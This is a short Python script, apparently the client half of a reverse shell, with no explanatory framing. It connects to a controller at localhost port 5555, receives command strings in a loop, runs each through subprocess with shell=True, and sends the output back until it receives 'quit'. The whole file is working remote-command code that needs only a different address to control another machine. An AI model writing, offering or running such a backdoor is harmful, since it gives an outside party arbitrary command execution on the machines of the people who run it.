import socket
import subprocess
import sys
import shlex

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 5555))
print("connection is established")

while True:
    command = s.recv(1024).decode()
    match command:
        case 'quit':
            s.close()
            sys.exit()
        case _:
            exec = subprocess.Popen(shlex.split(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            result = exec.stdout.read().decode() + exec.stderr.read().decode()
            if not result:
                s.send("success".encode())
            else:
                s.send(result.encode())
